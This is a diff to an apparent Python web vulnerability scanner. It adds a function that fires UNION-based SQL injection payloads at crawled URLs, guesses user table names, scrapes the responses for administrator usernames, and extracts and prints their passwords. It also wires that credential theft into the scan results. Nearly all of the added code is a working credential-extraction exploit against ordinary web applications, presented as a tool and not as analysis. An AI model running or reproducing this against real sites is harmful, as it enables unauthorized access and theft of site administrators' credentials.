@@ -97,6 +97,91 @@ def find_urls_to_test(url, base_url):
 
     return links
 
+def exploit_sqli_users_table(url):
+    """
+    Performs SQL injection to attempt to retrieve the administrator's password from the users table.
+
+    Args:
+        url (str): The URL to target for SQL injection.
+
+    Returns:
+        bool: True if the administrator's password is found, False otherwise.
+
+    Description:
+        - Constructs a SQL injection payload to extract the 'username' and 'password' from the 'users' table.
+        - Sends a request with the SQL payload appended to the URL.
+        - If the response is in HTML format, it parses the content for common usernames.
+        - If a username is found, it retrieves the associated password and prints it.
+        - Returns True if the password is successfully found, otherwise returns False.
+        - Handles SSL errors and other request-related exceptions.
+    """
+    
+    common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin','user']
+    possible_tables = ['users', 'usuarios', 'user_accounts', 'login', 'members']
+
+    def try_payload(sql_payload):
+        """
+        Internal helper function to test a SQL payload across all possible tables.
+        Returns True if a password is found, otherwise False.
+        """
+
+        for table in possible_tables:
+            payload_to_try = sql_payload.format(table=table)
+            #print(f"[DEBUG] Trying payload: {payload_to_try}")
+            try:
+                r = requests.get(url + payload_to_try, verify=False, proxies=proxies, timeout=10)
+            except SSLError as e:
+                print(f"[-] SSL Error en {url}: {e}")
+                continue
+
+            if "text/html" in r.headers.get("Content-Type", ""):
+                soup = BeautifulSoup(r.text, 'html.parser')
+            else:
+                #print(f"[-] La respuesta no es de tipo HTML con el payload: {payload_to_try}")
+                continue
+
+            if not soup.body:
+                #print(f"[-] No se encontró un cuerpo HTML válido con el payload: {payload_to_try}")
+                continue
+
+            for username in common_usernames:
+                user_element = soup.body.find(string=username)
+                if user_element:
+                    parent = user_element.parent
+                    password_element = parent.findNext('td') if parent else None
+
+                    if password_element and password_element.contents:
+                        admin_password = password_element.contents[0]
+                        print(Fore.GREEN + f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
+                        return True, admin_password
+                    
+            admin_element = soup.find(string=re.compile(r'.*administrator.*'))
+            if admin_element:
+                try:
+                    admin_password = admin_element.split('*')[1]
+                    print(Fore.GREEN + f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
+                    return True, admin_password
+                except IndexError:
+                    print(f"[-] Failed to correctly extract the administrator password from the payload '{payload_to_try}'")
+
+            #print(f"[-] No se encontraron usuarios comunes en la tabla '{table}' con el payload '{payload_to_try}'")
+
+        return False, None
+    
+    first_payload = "' UNION select username, password from {table}--"
+    found, admin_password = try_payload(first_payload)
+    if found:
+        return True, admin_password
+    
+    
+    second_payload = "' UNION select NULL, username || '*' || password from {table}--"
+    found, admin_password = try_payload(second_payload)
+    if found:
+        return True, admin_password
+
+    print(f"[-] Failed to retrieve the administrator credentials.")
+    return False, None
+    
 def exploit_sqli(url):
     payloads = [
         "' OR '1'='1",
@@ -201,8 +286,11 @@ def handle_scan():
         
         for test_url in urls_to_test:
             print(f"\n[+] Testing URL: {test_url}")
+            
             sqli_result = exploit_sqli(test_url)
             num_col = exploit_sqli_column_number(test_url)
+            admin_found, admin_password = exploit_sqli_users_table(test_url)
+            
             if sqli_result:
                 results.append({
                     "url": test_url,
@@ -215,6 +303,15 @@ def handle_scan():
                     "url": test_url,
                     "columns_detected": num_col
                 })
+                
+            if admin_found:
+                print(Fore.GREEN + f"[+] Se encontró la contraseña del administrador en {test_url}: {admin_password}.")
+                results.append({
+                    "url": test_url,
+                    "admin_password_found": True,
+                    "admin_password": admin_password
+                })
+                
             else:
                 print("[-] URL not vulnerable to SQL injection")
             
@@ -222,8 +319,10 @@ def handle_scan():
             "status_messages": status_messages,
             "sql_vulnerabilities_found": any('payloads' in result for result in results),
             "columns_detected_found": any('columns_detected' in result for result in results),
+            "admin_password_found": any('admin_password_found' in result for result in results),
             "sql_injection_results": [r for r in results if 'payloads' in r],
-            "column_detection_results": [r for r in results if 'columns_detected' in r]
+            "column_detection_results": [r for r in results if 'columns_detected' in r],
+            "admin_password_results": [r for r in results if 'admin_password_found' in r]
         })
         
     else:
